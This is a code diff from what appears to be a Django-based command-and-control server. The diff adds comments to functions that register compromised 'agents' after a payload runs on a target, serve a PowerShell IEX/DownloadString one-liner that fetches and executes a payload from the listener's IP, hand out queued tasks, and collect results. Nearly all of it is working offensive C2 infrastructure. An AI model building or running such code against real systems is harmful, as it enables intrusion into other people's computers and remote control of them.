@@ -38,7 +38,7 @@ def get_client_ip(request):
     return ip
 
 
-
+#Agent Registeration by sending POST-Req with hostname & username after executing the payload on the Target
 def registerAgent(request):
     if request.method=='POST':
         hostname = request.POST['hname']
@@ -190,7 +190,7 @@ class Listener():
             except:
                 print("Failed. Check your options.")
                 
-
+# Create Download link to redirect to sendFile funtion
         def sendScript(request , eth=''):
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
@@ -198,7 +198,7 @@ class Listener():
             oneliner = "IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(ip,str(port),eth)
             return HttpResponse(oneliner)
 
-
+# execute payload content to get the connection to our server
         def sendFile(request, eth=''):
             output_path= "/tmp/{}".format(eth)
             f    = open("{}".format(output_path), "rt")
@@ -206,7 +206,7 @@ class Listener():
             f.close()
             return HttpResponse(data)
 
-
+# read tasks then remove tasks file
         def serveTasks(request,name=''):
             tasksPath = listen_path+"agents/{}/tasks".format(name)
             if os.path.exists(tasksPath):
@@ -218,7 +218,7 @@ class Listener():
             else:
                 return HttpResponse('')
 
-
+#Receive results from the Agent then put it in result file
         def receiveResults(request,name=''):
                 resultspath = listen_path+"agents/{}/results".format(name)
                 if request.method == 'POST':
